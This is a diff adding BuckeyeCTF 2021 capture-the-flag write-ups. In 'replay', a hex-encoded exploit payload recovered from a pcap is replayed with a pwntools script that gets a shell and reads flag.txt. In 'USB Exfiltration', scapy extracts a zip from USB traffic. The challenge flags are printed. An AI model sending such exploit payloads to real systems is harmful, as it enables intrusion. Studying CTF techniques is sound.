@@ -9,7 +9,6 @@ tags:
 
 # pwn
 
----
 
 ## staff
 
@@ -105,4 +104,92 @@ print(target.recvline())
 target.sendline(payload)
 print(target.recvall())
 
+```
+
+---
+
+# misc
+
+## replay
+
+challenge pcap [file](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/replay/dist/replay.pcap) 
+
+We are given the network capture of a payload being sent to a binary to exploit it.
+So we just need to find that payload from the network capture and send it to the server where the binary is running.
+
+examining the pcap file, we find there is a packet with data that looks like a payload `aaaaaa.....`
+
+So we copy that raw data from there.
+
+```python
+6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
+```
+
+I converted this to hexadecimal character escape form in a adhoc fashion and then printed it as byte data, and routed that to the binary server.
+
+but I later found out there is a better way to do it, with `fromhex()` function ( v > 3.5)
+
+```python
+from pwn import *
+
+target = remote('misc.chall.pwnoh.io',13371)
+rawpayload = "6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a"
+payload = bytes.fromhex(rawpayload)
+target.recvline()
+target.sendline(payload)
+target.interactive()
+```
+
+```python
+❯ python3 pwntl.py
+[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
+[*] Switching to interactive mode
+$ cat flag.txt
+buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
+```
+
+---
+
+## USB Exfiltration
+
+We are given the traffic of a usb transfer and there has been a transfer of `zip` file.
+
+[pcapng file](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/usb_exfiltration/dist/exfiltration.pcapng)
+
+Opening this in wireshark shows a lot of (644) packets. Most of them are small, but some of them standout in size. Examining the first of them (in time order) showed that it started with `PK...` which told me it is the bytes of a zip file.
+
+I observed that this data was in the packet numbers - `415,417,.....497`
+
+So I used `scapy` in python to extract and join them together
+
+```python
+from scapy.all import *
+packets = rdpcap('./exfiltration.pcapng')
+data = b""
+i = 414  # 0 indexed
+while i<=496:
+	data += raw(packets[i])[64:]
+	i+=2
+f = open("zipfile", "wb")
+f.write(data)
+```
+
+unzipping the file we get two files :
+
+`meme.png`
+
+![meme](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/usb_exfiltration/src/meme.png)
+
+`flag.b64`
+
+```python
+YnVja2V5ZXt3aHlfMXNudF83aDNyM180X2RpNTVlY3Qwcl80X3RoMXN9Cg==
+```
+
+decoding this base64 data
+
+```python
+>>> import base64
+>>> base64.b64decode("YnVja2V5ZXt3aHlfMXNudF83aDNyM180X2RpNTVlY3Qwcl80X3RoMXN9Cg==")
+b'buckeye{why_1snt_7h3r3_4_di55ect0r_4_th1s}\n'
 ```
